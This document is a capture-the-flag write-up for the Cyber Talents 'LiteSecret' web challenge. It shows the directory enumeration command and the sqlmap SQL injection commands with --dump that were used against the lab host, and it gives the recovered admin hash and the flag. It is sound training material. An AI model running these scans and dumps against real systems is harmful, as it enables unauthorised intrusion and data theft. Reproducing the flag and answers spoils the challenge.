
# LiteSecret - Cyber Talents

To solve this challenge, I checked the elements in the dev tools and here is what I found:

![image](https://github.com/user-attachments/assets/8e7c33d5-4265-473f-b7dd-021f39b9e7b9)

---

## Step 2: Enumerating Subdirectories

After noticing there are subdirectories to traverse, I used **Dirsearch**:

```bash
dirsearch -u http://wcamxwl32pue3e6mkgvdrq0i9zrqe435p0l7s835-web.cybertalentslabs.com/login -x 403,404
```

Results:

![image](https://github.com/user-attachments/assets/ca5dbc8b-93cc-44d8-a511-c4c4e2ad900c)
![image](https://github.com/user-attachments/assets/ad25394d-19f6-46b8-af2d-aa2ad9229a6d)

---

## Step 3: Testing Input Fields for SQL Injection using Post method

I tried injecting input fields but they were ineffective, even with **SQLMap**. Here’s the command I used:

```bash
sqlmap -u "http://wcamxwl32pue3e6mkgvdrq0i9zrqe435p0l7s835-web.cybertalentslabs.com/login" --dbms=sqlite --level=3 --risk=3 --dump --ignore-code=500,404 --random-agent --threads=10 --answers=y --data="username=admin&password=pass"
```

Outcome:

![image](https://github.com/user-attachments/assets/4e2745da-8369-4fe5-b675-274df78ad258)

---

## Step 4: Using GET Method for SQL Injection

Next, I attempted SQL injection using the **GET** method with the following command:

```bash
sqlmap -u "http://wcamxwl32pue3e6mkgvdrq0i9zrqe435p0l7s835-web.cybertalentslabs.com/home/1" --dbms=sqlite --technique=BU --level=3 --risk=3 --dump --ignore-code=500,404 --random-agent --threads=10 --answers=y
```

Results:

![image](https://github.com/user-attachments/assets/3affacf1-0fa6-4cdd-9a46-4d5a0f0cfe24)
![image](https://github.com/user-attachments/assets/66e9f816-87b0-4f17-abc0-a45007bae9c1)

---

## Credentials Found

- **Username**: `Admin`
- **Password**: `3da0f453651f0eca43e02645b68ec83c3c659b9d57ea556d0842047c9393c789`

---

## Final Step: Retrieving the Flag

The flag obtained is:

**FLAG{4adc81ee29410e84b89f52c529a9b80774713a68aca48ffd6d0614896aa8704f}**

---

### Notes
- Use `--threads=10` to make the scanning process faster.
